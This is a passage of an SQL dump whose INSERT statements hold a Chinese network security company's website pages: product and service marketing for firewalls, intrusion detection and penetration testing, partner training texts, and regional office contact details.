FW3000系列以上硬件防火墙，同时把一些允许公共访问的服务器放在非军事区，并且还可以在这些服务器上安装黑盾网络入侵检测系统引擎，与黑盾防火墙联动，立体式保障教育信息网的安全，同时学校与学校之间的互联尽量采用VPN加密技术，保证信息的可靠性。</p><p>成功应用案例:</p><p>福州大学图书馆、福建师范大学图书馆、莆田学院、福建信息职业技术学院、福建医科大学、福建警察学院、厦门海洋职业技术学院、泉州医学高等专科学院、福建艺术学院、江西美佛儿国际学校、华侨大学、永安教育城域网、厦门海沧区教育城域网、福建华南女子学院、闽江学院.、福建省教育厅、福建省自考办......</p>','1','4','/public/home/default/img/introduce/Education.png');
INSERT INTO `xyh_category` VALUES ('47','下一代应用威胁感知与防御解决方案','APT','/public/home/default/img/introduce/下一代.png','8','35','0','','','伴随着APT攻击造成的重大损失的同时，是传统安全监测与防御手段针对APT攻击的无能为力。从国家级的核设施网络到美国NASA，从世界互联网巨头GOOGLE到安全公 司翘楚RSA，无一不是APT攻击的受害者。如果说他们的安全做的不好，那世界上又有几家 能说比他们的安全做的更好呢？ APT剑指之下，没有那个部门能幸免。试想一下，当攻击者可以肆意进出和控制军事指挥系统、核系统、能源系统、交通指挥系统、金融系统，那么除 了信息的安全，我们实体的财产与生命安全，也将变得无比脆弱。在传统的企业安全防御系统中，IDS、I','','List_service.html','Show_article.html','<p>黑盾构筑社保系统入侵防御系统，安全到家</p><p>社会保障信息化系统安全工程是建立和完善社会保障体系、加快劳动力市场&quot;信息化、科学化、规范化、现代化&quot;建设的重要内容，是加强基金有效监管、提高宏观决策水平的重要基础工作，是改进劳动保障工作管理方式、提高管理水平和工作效率的有效手段。加快社会保障信息化工程建设对于实现劳动保障工作管理服务社会化，建立公共服务体系，推动劳动保障事业的新发展，更好地服务社会具有重大意义。为了达到社会保障信息化系统安全工程的建设目标，就必须实现总体规划，统一标准，建立健全的信息安全保障体系，解决政务信息网上信息传输的安全性问题，通过数据加密、权限管理、CA认证等手段防止信息在传输过程中被窃取、篡改、偷看、越权等问题，同时应防止因开后门而导致全网的安全漏洞的产生。</p><p>社保系统应用分析</p><p>劳动和社会保障系统的涉及面广、流程复杂，一方面要服务于广大的普通市民，另一方面也要和各个相关的政府机构联系。目前的社保服务是按照各个局办自身设置的职能提供的，职能独立，业务数据也分散在各个相关的局办应用系统中，不仅对公众的服务不便，而且对于上级政府的管理也不方便。总的说来，主要的问题集中体现在以下几个方面：</p><p>部门多：业务的涉及面广，涉及的部门、单位和第三方的机构众多，其各个业务系统的环境和标准不一，如何实现众多的异构系统的连接和通讯是问题之一；</p><p>用户广：用户的使用面广，层次不一；</p><p>流程复杂：服务流程往往涉及到多个部门的协同处理；</p><p>数据量大：由于参与的用户的数量众多，相应的形成的数据量也非常巨大；</p><p>业务应用广：包括电子邮件系统、IP电话系统、政务专网应用平台以及其他系统。</p><p>使用黑盾防火墙，实现社保系统安全集中管理</p><p>黑盾防火墙使用透明应用代理服务方式提供广泛的协议支持以及高速的吞吐能力，很好的解决了安全、性能及灵活性的协调。由于透明使用应用层的代理服务，黑盾防火墙提供了该领域最安全的解决方案，从而对访问的控制更加细致。</p><p>（1）保护脆弱的服务：</p><p>通过过滤不安全的服务，黑盾防火墙可以极大地提高网络安全和减少子网中主机的风险。例如，黑盾防火墙可以禁止NIS、NFS服务通过，黑盾防火墙同时可以拒绝源路由和ICMP重定向封包。</p><p>（2）控制对系统的访问：</p><p>黑盾防火墙可以提供对系统的访问控制。如允许从外部访问某些主机，同时禁止访问另外的主机。例如，黑盾防火墙允许外部访问特定的Mail Server和Web Server。</p><p>（3）集中的安全管理：</p><p>黑盾防火墙对社保系统内部网实现集中的安全管理，在黑盾防火墙定义的安全规则可以运用于整个内部网络系统，而无须在内部网每台机器上分别设立安全策略。如在黑盾防火墙可以定义不同的认证方法，而不需在每台机器上分别安装特定的认证软件。外部用户也只需要经过-次认证即可访问内部网。</p><p>（4）增强的保密性：</p><p>使用黑盾防火墙可以阻止攻击者获取攻击网络系统的有用信息，如Finger和DNS。</p><p>（5）记录和统计网络利用数据以及非法使用数据：</p><p>黑盾防火墙可以记录和统计通过黑盾防火墙的网络通讯，提供关于网络使用的统计数据，并且，黑盾防火墙可以提供统计数据，来判断可能的攻击和探测。</p><p>（6）策略执行：</p><p>黑盾防火墙提供了制定和执行网络安全策略的手段。未设置黑盾防火墙时，网络安全取决于每台主机的用户。</p><p>黑盾入侵检测系统，黑客无法逾越的墙</p><p>利用了防火墙技术，经过仔细的配置，通常能够在内外网之间提供安全的网络保护，降低了网络安全风险。但是，仅仅使用防火墙、网络安全还远远不够：</p><p>（1）入侵者可寻找防火墙背后可能敞开的后门。</p><p>（2）入侵者可能就在防火墙内。而防火墙无法实现对内部用户的网络监控，如：内部用户可能对网络服务器进行攻击，窃取资料，破坏服务器上的重要数据信息，令网络瘫痪；或者内部用户可能通过厦门劳动和社会保障局局域网向外进行非法攻击，造成重大破坏，而从外界追查只能知道攻击来自该公司网络，无法具体追查到责任人。</p><p>（3）由于性能的限制，防火墙通常不能提供实时的入侵检测能力。</p><p>入侵检测系统是近年出现的新型网络安全技术，目的是提供实时的入侵检测及采取相应的防护手段，如记录证据用于跟踪和恢复、断开网络连接等。实时入侵检测能力之所以重要首先它能够对付来自内部网络的攻击，其次它能够缩短黑客入侵的时间。黑盾入侵检测系统作为一种积极主动的安全防护产品，提供了对内部攻击、外部攻击和误操作的实时保护，在网络系统受到危害之前，拦截和响应入侵。从网络安全的立体纵深、多层次防御的角度出发，入侵检测系统理应受到人们的高度重视。黑盾网络入侵检测系统用于保护关键应用的网段和服务器，实时监视可疑的连接、日志检查，非法访问的闯入等，并且提供对典型应用的监视。</p><p>（1）精确地判断入侵事件</p><p>黑盾网络入侵检测系统有一个完整的黑客攻击信息库，其中存放着各种黑客攻击行为的特征数据。每当用户在网络上操作时，黑盾网络入侵检测系统就将用户的操作与信息库中的数据进行匹配，一旦发现吻合，就认为此项操作为黑客攻击行为。由于信息库的内容会不断升级，因此可以保证新的黑客攻击方法也能被及时发现。</p><p>（2）可判断应用层的入侵事件</p><p>与防火墙不同，黑盾网络入侵检测系统是通过分析数据包的内容来识别黑客入侵行为的。因此，黑盾网络入侵检测系统可以判断出应用层的入侵事件。这样就极大的提高了判别黑客攻击行为的准确程度。</p><p>（3）对入侵可以立即进行反应</p><p>黑盾网络入侵检测系统以进程的方式运行在监控机上，为网络系统提供实时的黑客攻击侦测保护。一旦发现黑客攻击行为，黑盾网络入侵检测系统可以立即做出相应。响应的方法有多种形式，其中包括：报警（如屏幕显示报警、声音报警）、必要时关闭服务直至切断链路，与此同时，黑盾网络入侵检测系统会对攻击的过程进行详细记录，为以后的调查工作提供线索。</p><p>（4）全方位的监控与保护</p><p>防火墙只能隔离来自本网段以外的攻击行为，而黑盾网络入侵检测系统监控的是所有网络的操作，因此它可以识别来自本网段内、其他网段以及外部网络的全部攻击行为。这样就有效的解决了来自防火墙后由于用户误操作或内部人员恶意攻击所带来的安全威胁。</p><p>（5）针对不同操作系统特点</p><p>网络上运行着各种应用，服务器的操作系统平台也是多种多样。黑盾网络入侵检测系统根据系统平台的不同进行有针对性的检验，从而提高了工作效率，同时也提高了侦测的准确性。</p><p>社会保障信息化系统安全工程建成以后，将建立一个具有高安全性、高可靠性、可管理的电子政务网络平台，本工程建成后，将实现劳动与社会保障部门内部利用先进的网络信息技术实现办公自动化、管理信息化、决策科学化，政府部门与社会各界利用网络信息平台充分进行信息共享与服务、加强群众监督、提高办事效率及促进政务公开等等，从而使社会保障系统建成一个精简、高效、廉洁、公平的政府运作模式。</p><p>成功应用案例:</p><p>福建省劳动和社会保障厅、福建省医疗保险管理中心、厦门市劳动和社会保障局、福建省劳动就业中心、福州市劳动和社会保障局</p>','1','1','/public/home/default/img/introduce/Social.png');
INSERT INTO `xyh_category` VALUES ('52','合作理念','Cooperation','/public/home/default/img/introduce/Cooperation.png','9','32','0','','','福建省海峡信息技术有限公司对代理商的培训内容主要定位在两个方面：技术支持培训和销售技能培训。','','List_detail.html','Show_article.html','<p>福建省海峡信息技术有限公司对代理商的培训内容主要定位在两个方面：技术支持培训和销售技能培训。</p><p>技术支持培训内容，包括专门为合作伙伴举办的一系列培训课程及活动，包括安全产品的分类；安全产品的基本概念和原理以及作用、重要性及局限性；安全产品的安全策略；典型安全产品的自身安全与日常维护；典型安全产品的配置演示；产品与技术更新、行业解决方案等。为代理商培训技术人员，由我司技术人员到代理商处，或代理商的技术人员到我司的培训中心，进行详细的技术培训，并提供所需技术资料；对于代理商组织或参加的会议，如有需要，我司可派技术人员前往作产品介绍、演示或技术咨询；对于双方的合作初期（ 3 个月左右），针对代理商较重要的客户，应代理商要求，我司可派技术人员前往现场做技术讲解；对于双方的合作初期，针对较重要的客户的产品安装，应代理商要求，我司可派技术人员到现场做指导；当代理商在争取客户时，应代理商要求，我司技术部可尽量提供完善的客户解决方案，以帮助代理商争取客户。售前技术培训，目前，从部分已有合作伙伴实施效果来看，这一系列培训为加强合作伙伴的售前技术支持能力起到了举足轻重的作用。</p><p>在销售技能培训方面，海峡信息特别开设了两项内容 -- 销售技能培训与领导技能培训。 产品销售技能培训包含产品功能演示技巧、销售技能以及销售案例分析。 在这里，海峡信息的资深销售经理可以系统而深入地教授关于怎样才能成功赢得关键性大订单的指导。</p><p>建立完整的、专业化的合作伙伴支持及服务队伍，建立完善的支持与服务体系，是福建省海峡信息技术有限公司渠道建设中的关键环节。合作伙伴是福建省海峡信息技术有限公司不断发展的重要资源，与合作伙伴同舟共济，为他们提供全面的管理与服务支持，这不仅是对合作伙伴的承诺，也是海峡信息公司不断壮大的要求。福建省海峡信息技术有限公司愿意与广大合作伙伴一起为推动国家信息安全事业的发展，成为国内最具影响力的网络安全整体解决方案的提供商而共同努力！</p><p><br/></p>','1','1','/public/home/default/img/introduce/Cooperation.png');
INSERT INTO `xyh_category` VALUES ('53','渠道支持','Support','/public/home/default/img/introduce/Support.png','9','32','0','','','福建省海峡信息技术有限公司对代理商的培训内容主要定位在两个方面：技术支持培训和销售技能培训。','','List_detail.html','Show_article.html','<p>福建省海峡信息技术有限公司对代理商的培训内容主要定位在两个方面：技术支持培训和销售技能培训。</p><p>技术支持培训内容，包括专门为合作伙伴举办的一系列培训课程及活动，包括安全产品的分类；安全产品的基本概念和原理以及作用、重要性及局限性；安全产品的安全策略；典型安全产品的自身安全与日常维护；典型安全产品的配置演示；产品与技术更新、行业解决方案等。为代理商培训技术人员，由我司技术人员到代理商处，或代理商的技术人员到我司的培训中心，进行详细的技术培训，并提供所需技术资料；对于代理商组织或参加的会议，如有需要，我司可派技术人员前往作产品介绍、演示或技术咨询；对于双方的合作初期（ 3 个月左右），针对代理商较重要的客户，应代理商要求，我司可派技术人员前往现场做技术讲解；对于双方的合作初期，针对较重要的客户的产品安装，应代理商要求，我司可派技术人员到现场做指导；当代理商在争取客户时，应代理商要求，我司技术部可尽量提供完善的客户解决方案，以帮助代理商争取客户。售前技术培训，目前，从部分已有合作伙伴实施效果来看，这一系列培训为加强合作伙伴的售前技术支持能力起到了举足轻重的作用。</p><p>在销售技能培训方面，海峡信息特别开设了两项内容 -- 销售技能培训与领导技能培训。 产品销售技能培训包含产品功能演示技巧、销售技能以及销售案例分析。 在这里，海峡信息的资深销售经理可以系统而深入地教授关于怎样才能成功赢得关键性大订单的指导。</p><p>建立完整的、专业化的合作伙伴支持及服务队伍，建立完善的支持与服务体系，是福建省海峡信息技术有限公司渠道建设中的关键环节。合作伙伴是福建省海峡信息技术有限公司不断发展的重要资源，与合作伙伴同舟共济，为他们提供全面的管理与服务支持，这不仅是对合作伙伴的承诺，也是海峡信息公司不断壮大的要求。福建省海峡信息技术有限公司愿意与广大合作伙伴一起为推动国家信息安全事业的发展，成为国内最具影响力的网络安全整体解决方案的提供商而共同努力！</p><p><br/></p>','1','2','/public/home/default/img/introduce/Support.png');
INSERT INTO `xyh_category` VALUES ('54','相关下载','Download','','9','5','0','','','','','List_soft.html','Show_soft.html','','1','3','');
INSERT INTO `xyh_category` VALUES ('55','分销渠道','Distribution','/public/home/default/img/introduce/Distribution.png','9','2','0','','','','','List_page.html','Show_article.html','','1','4','/public/home/default/img/introduce/Distribution.png');
INSERT INTO `xyh_category` VALUES ('56','战略合作','','/public/home/default/img/introduce/Strategy.png','9','2','0','','',' McAfee、趋势科技、熊猫卫士 等合作伙伴','','List_page.html','Show_article.html','<table><tbody><tr class=\"firstRow\"><td><img src=\"/ueditor/php/upload/image/20170613/1497333906520211.gif\"/></td><td><span style=\"font-size: 15px; color:#8a8a8b !important\">迈克菲是网络安全和可用性解决方案的领先供应商。所有McAfee产品均以著名的防病毒研究机构（如 McAfee AVERT）为后盾，该机构可以保护McAfee消费者免受最新和最复杂病毒的攻击。</span></td></tr><tr><td><br/></td><td><br/></td></tr><tr><td><img src=\"/ueditor/php/upload/image/20170613/1497333938692596.gif\"/></td><td style=\"word-break: break-all;\"><span style=\"font-size: 15px;color:#8a8a8b !important\">趋势科技——网络安全软件及服务领域的全球领导者，以卓越的前瞻和技术革新能力引领了从桌面防毒到网络服务器和网关防毒的潮流，以独特的服务理念向业界证明了趋势科技的前瞻性和领导地位。</span></td></tr><tr><td><br/></td><td><br/></td></tr><tr><td><img src=\"/ueditor/php/upload/image/20170613/1497333961656234.gif\"/></td><td style=\"word-break: break-all;\"><p><span style=\"font-size: 15px;color:#8a8a8b !important\">Panda软件公司是欧洲第一位的计算机安全产品公司，也是唯一最大的杀病毒软件公司内拥有100%自有技术，且足以同美国相抗衡的公司，同时Panda 也是世界上在该领域成长最快的公司。</span></p></td></tr></tbody></table>','1','5','/public/home/default/img/introduce/Strategy.png');
INSERT INTO `xyh_category` VALUES ('57','社会招聘','Recruitment','/public/home/default/img/introduce/newrecru.png','10','1','0','','','','','List_article.html','Show_article.html','','1','2','/public/home/default/img/introduce/newrecru.png');
INSERT INTO `xyh_category` VALUES ('58','长期招聘','Recruitment','/public/home/default/img/introduce/longrecru.png','10','1','0','','','','','List_article.html','Show_article.html','','1','3','/public/home/default/img/introduce/longrecru.png');
INSERT INTO `xyh_category` VALUES ('67','联系我们','ContactUs','','11','33','0','','','福建省海峡信息技术有限公司 总部地址：福建省福州市北环中路61号海峡信息大楼2F 邮编： 350003','','List_contact.html','Show_article.html','<p>福建省海峡信息技术有限公司&nbsp;</p><p>总部地址：福建省福州市北环中路61号海峡信息大楼2F&nbsp;</p><p>邮编： 350003&nbsp;</p><p>市场销售电话： 0591-87303701//02/03/12</p><p>技术服务电话： 0591-87303705//06/07&nbsp;</p><p>传真： 0591-87303709&nbsp;</p><p>客服电话： 400-6353-500&nbsp;</p><p>厦门办事处：&nbsp;</p><p>地址：厦门市思明区洪莲西里160号1401室</p><p>电话：0592-5122819</p><p>传真：0592-5122819</p><p>联系人：高志伟&nbsp;</p><p>E-mail：gaozw@mail.si.net.cn</p><p>泉州办事处：&nbsp;</p><p>地址：泉州市宝洲路南丰新城玉兰苑2栋7C</p><p>电话：0595-22576310、22577310</p><p>传真：0595-22577310</p><p>联系人：赖孝友</p><p>E-mail：laixy@mail.si.net.cn</p><p>三明办事处：&nbsp;</p><p>地址：三明市梅列区丁香新村52栋504室&nbsp;</p><p>电话：(0598)8226785 18960568176&nbsp;</p><p>传真：(0598)8226785&nbsp;</p><p>联系人：张戟&nbsp;</p><p>E-mail：zhangj@mail.si.net.cn</p><p>龙岩办事处：&nbsp;</p><p>地址：龙岩市西陂路286号西山小区A2栋406&nbsp;</p><p>电话：0597-2586623&nbsp;</p><p>传真：0597-2586623&nbsp;</p><p>联系人：游娇丽&nbsp;</p><p>E-mail：youjl@mail.si.net.cn</p><p>漳州办事处：&nbsp;</p><p>地址：漳州市龙文区迎宾大道10号锦绣一方蔷薇里4幢3B号&nbsp;</p><p>电话：0596-2968273&nbsp;</p><p>传真：0596-2968273&nbsp;</p><p>联系人：李燕南&nbsp;</p><p>E-mail：lyn@mail.si.net.cn</p><p>北京办事处：&nbsp;</p><p>地址：北京市石景山区石景山路甲18号院2号楼万达广场F座1213&nbsp;</p><p>电话：(010)88259159 13910122621</p><p>传真：(010)88696122</p><p>联系人：刘涛</p><p>E-mail：liut@mail.si.net.cn</p><p>广州办事处：&nbsp;</p><p>地址：广东省广州市越秀区广卫路23号7楼&nbsp;</p><p>电话：020-83274196 15989221652</p><p>传真：020-83388515</p><p>联系人：程丽霞</p><p>E-mail：clx@mail.si.net.cn</p><p>深圳办事处：&nbsp;</p><p>地址：深圳市罗湖区笋岗东路2121号华凯大厦27层2702&nbsp;</p><p>电话：0755-25582358</p><p>传真：0755-25566556</p><p>联系人：曹振军</p><p>江西办事处：</p><p>地址： 江西省南昌市抚河中路华财大厦A156室&nbsp;</p><p>电话： 0791-6693397 6695770 13576139449</p><p>传真： 0791- 6695770&nbsp;</p><p>联系人：胡争明</p><p>E-mail： huzm@mail.si.net.cn&nbsp;</p><p>新疆办事处：</p><p>地址：新疆乌鲁木齐市新市区河南西路23街13楼20号</p><p>电话:0991-2815591　15699126518&nbsp;</p><p>传真:0991-2815591</p><p>联系人：肖大力</p><p>E-mail：xiao_dl@126.com</p><p>甘肃办事处：</p><p>地址：甘肃省兰州市城关区永昌路360号泰洋大厦706室</p><p>电话:0931-4561180 13919406373</p><p>传真：0931-4561180&nbsp;</p><p>联系人：史建平</p><p>E-mail：lzfox@189.cn</p><p>陕西办事处：</p><p>地址：西安市高新路一号高新枫尚B座2506</p><p>电话:(029)88257602 18729255987</p><p>传真：(029)88257602</p><p>联系人： 李潇</p><p>E-mail：lixiaokovesun@163.com</p><p>湖北办事处：</p><p>地址：湖北省武汉市江岸区解放大道1070号财富大厦1738室</p><p>电话: 027-82756707 &nbsp; 18627122611 13007118191</p><p>传真：027-82756707</p><p>联系人： 屠永强、苏鹏</p><p>E-mail：tuyq@whzttx.com 13007118191@163.com</p><p>湖南办事处：</p><p>地址： 长沙市高新区麓谷大道662号软件大楼602室</p><p>电话: 0731-85261991 13974829169&nbsp;</p><p>传真： 0731-85261991</p><p>联系人： 周晶亮</p><p>E-mail： zhoujl@mail.si.net.cn</p><p>江苏办事处（负责江苏、安徽两省）：&nbsp;</p><p>地址: 南京市黄埔路2-2号黄埔大酒店15楼&nbsp;</p><p>电话：025-84069790 13584047348</p><p>传真：025-84069790</p><p>联系人：刘燕</p><p>E-mail：jsliuyong@mail.si.net.cn</p><p>四川办事处：&nbsp;</p><p>地址：成都市锦江区静渝路48号索尔龙舟大厦705&nbsp;</p><p>电话：028-65194705 15982215382&nbsp;</p><p>传真：028-65194705&nbsp;</p><p>联系人：张振东&nbsp;</p><p>E-mail：zhangzd@mail.si.net.cn</p><p><br/></p>','1','8','');
INSERT INTO `xyh_category` VALUES ('99','校园招聘','School','/public/home/default/img/schoolzhao.png','10','1','0','','','','','List_article.html','Show_article.html','','1','1','');
INSERT INTO `xyh_category` VALUES ('85','应用软件安全测试','SecurityTesting','/public/home/default/img/server/02.png','5','35','0','','','海峡信息建立起应用安全研究团队，专注于应用软件安全方面的漏洞研究、攻防研究和代码加固研究，并通过深入研究来自于微软的“软件安全开发生命周期”流程，提出了海峡信息应用软件安全开发生命周期解决方案','','List_service.html','Show_article.html','<p>多年以来，有两点我可以确定：一是对于高保障性（high assurance）软件的社会需求呈不断增长的态势；二是市场从来就不会提供这样的软件。——Earl Boebert</p><p>对安全而言，开源是一件好事，因为这种方式可以防止你违反科克霍夫法则——Eric Raymond</p><p>在以前的单机时代，安全问题主要是操作系统容易感染病毒，单机应用程序软件安全问题并不突出。但是自从互联网普及后，软件安全问题愈加显加突显，使得软件安全性测试的重要性上升到一个前所未有的高度。</p><p>软件安全性是一个广泛而复杂的主题，每一个新的软件总可能有不符合所有已知模式的新型安全性缺陷出现。近年来， 类似于CSDN、天涯网大规模用户信息泄露的安全事件时有发生，这些安全事件的根本原因是应用软件自身存在软件安全漏洞。如果应用系统能够在上线之初就能够执行专业的Web应用上线测试服务，很多安全问题就能够消灭在萌芽中。</p><p>服务介绍</p><p>海峡信息建立起应用安全研究团队，专注于应用软件安全方面的漏洞研究、攻防研究和代码加固研究，并通过深入研究来自于微软的“软件安全开发生命周期”流程，提出了海峡信息应用软件安全开发生命周期解决方案，如下图所示：</p><p><img src=\"http://www.fjssc.cn/uploads/allimg/130926/1-13092611092B54.png\"/></p><p>海峡信息“应用上线测试”服务采用了黑盒与白盒测试技术相结合服务模式，旨在针对“电子政务、电子商务”重要应用应用系统的应用安全展开全面的安全测试，该测试参照国际开放Web应用安全组织（OWASP）相关规范并结合海峡信息多年的最佳实践经验，可以在应用系统上线前或运行中展开安全测试。</p>','1','2','/public/home/default/img/server/02.png');
INSERT INTO `xyh_category` VALUES ('90','渗透测试服务','TestingService','/public/home/default/img/server/06.png','5','35','0','','','渗透测试为纯人工的安全漏洞挖掘过程，通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种服务。在该过程中，海峡信息安全研究专家通过其已经掌握的攻击方法，对系统的任何弱点、技术缺陷和漏洞进行全面、深入和扩大化的主动分析。','','List_service.html','Show_article.html','<p>我一直认为，如果你暴露出一点弱点，那应该是一件好事情——Janet Reno</p><p>如果可以被证明是安全的，那么也有可能不是安全的——Lars Knudsen</p><p>渗透测试是一种全新的安全防护思路，将安全防护从被动转换成了主动。正是因为看到了这一点，很多重点行业的企业越来越多地通过独立的第三方安全机构来进行“渗透测试”，以求更好的安全防护效果。</p><p>随着电子商务、电子政务的发展，越来越多重点单位和企业在安全上投入了巨大的精力和资金，但有时候用户会有这样的感受：当基本的软硬件设施配置好之后，安全防卫水平就到了一个相对的瓶颈，再加大投入并不能明显提高安全水平。实际上，这种“安全玻璃天花板”在很多行业和企业中都存在，而“渗透测试” 成为了解决这个问题的新角度之一。</p><p>客户需求</p><p>（1）自动化扫描可能存在误报或是漏报；</p><p>（2）自动化扫描可能很全面，但是却不够深入；</p><p>（3）急需一种辅助的方法与自动化扫描相结合，更好的评估系统。</p><p>服务介绍</p><p>渗透测试为纯人工的安全漏洞挖掘过程，通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种服务。在该过程中，海峡信息安全研究专家通过其已经掌握的攻击方法，对系统的任何弱点、技术缺陷和漏洞进行全面、深入和扩大化的主动分析。</p><p>测试方法</p><p>黑箱测试：完全模拟黑客的入侵方式来进行渗透测试</p><p>白盒测试：测试者可以通过正常渠道向被测单位取得各种资料来进行渗透测试</p><p>渗透目标</p><p>操作系统渗透：对Windows、Solaris、AIX、Linux、等操作系统本身进行渗透测试。</p><p>数据库系统渗透：对MS-SQL、Oracle、MySQL、等数据库应用系统进行渗透测试。</p><p>应用系统渗透： 对渗透目标提供的各种应用，如ASP、CGI、JSP、PHP等组成的WWW应用进行渗透测试。</p><p>网络设备渗透： 对各种防火墙、入侵检测系统、网络设备进行渗透测试。</p><p>客户价值</p><p>（1）深度挖掘计算机网络系统中的安全漏洞，并判断漏洞可能造成的最大限度的损失；</p><p>（2）以最真实的测试方法，让客户体验计算机网络系统遭受黑客入侵时的措手不及，以便及早防护；</p><p>（3）以最权威的客户数据，让客户感受计算机网络系统安全漏洞将带来的影响和损失，以便做好安全损失与保护的评估。</p>','1','6','/public/home/default/img/server/06.png');
INSERT INTO `xyh_category` VALUES ('91','安全加固优化服务','OptimizationService','/public/home/default/img/server/07.png','5','35','0','','','海峡信息安全研究团队具有专业的网络策略研究、操作系统安全、数据库安全、Web应用安全相关的专业技术人员，能够协助用户在风险可控的条件下对信息系统开展安全加固和安全优化服务。','','List_service.html','Show_article.html','<p>安全加固优化服务</p><p>他们总是试图从内部和外部的黑暗中逃避出来。梦想系统足够完美，以至于没有人能做成坏事——TS Eliot</p><p>由于功能复杂，代码庞大，计算机操作系统、数据库系统在设计上存在一些安全漏洞和一些未知的“后门”，一般情况下很难发现，同时由于系统的配置不当也会带来 安全隐患，是黑客攻击得手的关键因素。因此，信息系统在投入使用前和使用中，都需要对操作系统、数据库系统等进行安全加固，以提高系统安全防范能力，减少安全事件的发生。</p><p>安全加固是配置软件系统的过程，针对服务器操作系统、数据库及应用中间件等软件系统，通过打补丁、强化帐号安全、加固服务、修改安全配置、优化访问控制策 略、增加安全机制等方法，堵塞漏洞及“后门”，合理进行安全性加强，提高其健壮性和安全性，增加攻击者入侵的难度，软件系统安全防范水平得到大幅提升。</p><p>客户需求</p><p>（1）为什么针对信息业务系统入侵事件频繁发生？</p><p>（2）为什么信息业务系统恢复后威胁仍然存在？</p><p>（3）为什么已经部署了安全设备但被黑事件还会出现？</p><p>（4）如何全面了解企业信息业务系统安全脆弱性状况？</p><p>（5）如何建立完善的安全加固机制？</p><p>（6）通过什么方法去发现和修补这些风险和漏洞？</p><p>服务介绍</p><p>海峡信息安全研究团队具有专业的网络策略研究、操作系统安全、数据库安全、Web应用安全相关的专业技术人员，能够协助用户在风险可控的条件下对信息系统开展安全加固和安全优化服务。</p><p>流程图如下所示：</p><p><img src=\"http://www.fjssc.cn/uploads/allimg/130926/1-130926111923P4.png\"/></p><p>具体实例如图：</p><p><img src=\"http://www.fjssc.cn/uploads/allimg/130922/1-130922111H03B.PNG\"/></p><p>客户价值</p><p>（1）提升信息系统安全防护水平；</p><p>（2）堵塞漏洞减少网络攻击安全事件；</p><p>（3）防止系统入侵安全隐患再次被黑客利用；</p><p>（4）避免企业再次遭受黑客入侵的安全威胁；</p><p>（5）帮助企业客户建立完善的安全加固机制；</p><p>（6）最大限度降低信息安全运维成本。</p>','1','7','/public/home/default/img/server/07.png');
INSERT INTO `xyh_category` VALUES ('92','安全监控服务','MonitoringService','/public/home/default/img/server/MonitoringService.png','5','35','0','','','海峡信息网站安全监控系统，旨在帮助政府、企业和关注WEB安全的机构组织大规模、周期性检测网站已有的安全漏洞和安全隐患，使用户深入了解网站的安全现状和安全发展趋势，帮助用户在网站系统被恶意入侵前有效地对薄弱环节进行有针对性的修补。','','List_service.html','Show_article.html','<p>安全监控服务</p><p>一次是偶然，两次是巧合，但三次就是敌对的攻击了——Goldfinger</p><p>网站安全监测服务是为了完善WEB应用安全保障机制而存在的。通过网站安全监测服务与现有的WEB应用安全防护技术、防护产品、安全策略有机的整合，从而形成长效的WEB应用安全保障机制。</p><p>现如今，web应用安全产品五花八门。但其产品尚不能完整的覆盖WEB应用安全的生命周期，当前的安全防护方案仍缺少一套行之有效的长效安全保障措施。网站安全监测服务则是 为了完善WEB应用安全保障机制而存在的。通过网站安全监测服务与现有的WEB应用安全防护技术、防护产品、安全策略有机的整合，从而形成长效的WEB应用安全保障机制。网页挂马、SQL注入攻击和 XSS 跨站脚本攻击已经成为木马、病毒传播的主要途径之一。由于各种系统漏洞和软件漏洞的存在，因此通过入侵进行挂马的数量会继续增加。同时黑客通过SQL注入攻击或 XSS 跨站脚本攻击等手法入侵网站系统，从而篡改网站网页或数据库的内容，甚至植入各种各样的下载脚本代码。用户只要浏览被植入木马的网站，如果用户的操作系统存在漏洞就会遭遇木马入侵，从而造成个人信息泄露和财产损失。</p><p>客户需求</p><p>（1）实时远程安全监控服务，在第一时间检测到网站的安全问题</p><p>（2）无需安全任何软件或调整网络架构，无需购买和部署设备，在几小时内就可以检测服务投入运行</p><p>（3）专业的技术指导协助我及时消除安全威胁</p><p>服务介绍</p><p>7*24小时不间断的风险检测能力、检测平台与安全专家的有效整合、与现安全产品的无缝融合</p><p>海峡信息网站安全监控系统，旨在帮助政府、企业和关注WEB安全的机构组织大规模、周期性检测网站已有的安全漏洞和安全隐患，使用户深入了解网站的安全现状和安全发展趋势，帮助用户在网站系统被恶意入侵前有效地对薄弱环节进行有针对性的修补。</p><p>海峡信息网站监控系统总体框架示意图：</p><p><img src=\"http://www.fjssc.cn/uploads/allimg/130916/1-1309161434124U.PNG\"/></p><p>客户价值</p><p>海峡安全监测服务平台用于对广大用户群体提供远程安全监测服务。用户无需安装任何软件或调整网络架构，由于无需购买和部署设备，因此用户可以在几个小时内将监测服务投入运行，海峡信息将在第一时间将监测到的网站安全问题及时通报给用户，并给予专业的技术指导协助用户及时消除安全威胁。</p>','1','8','/public/home/default/img/server/08.png');
INSERT INTO `xyh_category` VALUES ('94','安全咨询服务','ConsultingService','/public/home/default/img/server/ConsultingService.png','5','35','0','','','海峡信息基于自有知识产权的IT风险管理与控制框架，结合对信息技术与信息安全相关标准/模型/规范的深刻理解，为客户提供一系列信息科技风险咨询服务，说明客户逐步将管理流程融入到日常行为中，更加有效地发挥管理体系的作用，并协助企业主动识别改进机会，持续提升管理体系价值。','','List_service.html','Show_article.html','<p>安全咨询服务</p><p>兵者，诡道也……利而诱之，乱而取之——孙武《孙子兵法》</p><p>随着社会信息化程度越来越高，企业的生存和发展越来越依赖于多方面的信息技术以及对信息技术的管理。信息技术的管理涉及信息安全管理体系咨询、IT治理、IT内部控制、IT规划、信息安全风险评估、业务连续性、IT服务管理、开发安全和运维等多方面领域。</p><p>服务介绍</p><p>海峡信息基于自有知识产权的IT风险管理与控制框架，结合对信息技术与信息安全相关标准/模型/规范的深刻理解，为客户提供一系列信息科技风险咨询服务，说明客户逐步将管理流程融入到日常行为中，更加有效地发挥管理体系的作用，并协助企业主动识别改进机会，持续提升管理体系价值。</p><p>客户价值</p><p>（1）从外部审视企业，全面了解企业安全现状</p><p>（2）解决企业实际存在的安全问题</p><p>（3）增强企业抗击安全威胁的能力</p><p>（4）更新企业员工安全意识</p>','1','9','/public/home/default/img/server/09.png');
